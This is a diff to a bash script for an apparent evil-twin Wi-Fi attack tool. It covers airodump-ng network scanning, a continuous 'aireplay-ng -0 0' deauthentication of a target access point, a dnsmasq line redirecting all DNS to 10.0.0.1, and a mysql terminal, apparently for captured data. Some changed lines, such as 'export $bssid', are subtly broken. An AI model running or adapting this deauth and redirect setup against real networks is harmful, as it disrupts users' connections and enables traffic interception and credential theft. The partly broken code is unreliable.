@@ -112,7 +112,7 @@ selectNetworkInterface2 () {
                         fi
                 else
                         interface2=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | sed -n 1p)
-                        if [ $interface -eq $interface2 ]
+			if [ "$1" = "$interface2" ]
                         then
                                 interface2=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | sed -n 2p)
                         fi
@@ -130,7 +130,7 @@ selectNetworkInterface2 () {
 }
 
 selectNetwork () {
-        gnome-terminal -e "bash -c \"airodump-ng -w $tempFolder/temporal --output-format netxml $interface; exec bash\"" -q -t "airodump-ng"
+        gnome-terminal --geometry 117x50+1000+0 -e "bash -c \"airodump-ng -w $tempFolder/temporal --output-format netxml $interface; exec bash\"" -q -t "airodump-ng"
 
         echo "[-] Press enter to stop scanning networks"
         read stop
@@ -182,11 +182,11 @@ selectNetwork () {
 deauth(){
         if [ $ok -eq 1 ]
         then
-		iwconfig "$interface2" channel "$channel"
+		iwconfig "$interface2" channel "$2"
                 echo
                 echo "Press enter to deauth"
                 read ola
-                aireplay-ng -0 0 -a "$bssid" $interface2
+                aireplay-ng -0 0 -a "$1" "$interface2"
         fi
 }
 
@@ -381,9 +381,10 @@ address=/#/10.0.0.1" > $tempFolder/dnsmasq.conf
         then
                 export -f deauth
                 export -f selectNetworkInterface2
- 		export bssid=$bssid
-		export channel=$channel
-                gnome-terminal --geometry 117x25+1000+600 -e "bash -c \"selectNetworkInterface2; deauth; exec bash\"" -q -t "Deauth $essid ($bssid) channel $channel"
+		export $bssid
+		export $channel
+		export $interface
+                gnome-terminal --geometry 117x25+1000+600 -e "bash -c \"selectNetworkInterface2 \"$interface\"; deauth \"$bssid\" \"$channel\"; exec bash\"" -q -t "Deauth $essid ($bssid) channel $channel"
 		export -f titulo
 		gnome-terminal --geometry 117x25+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database"
 	else
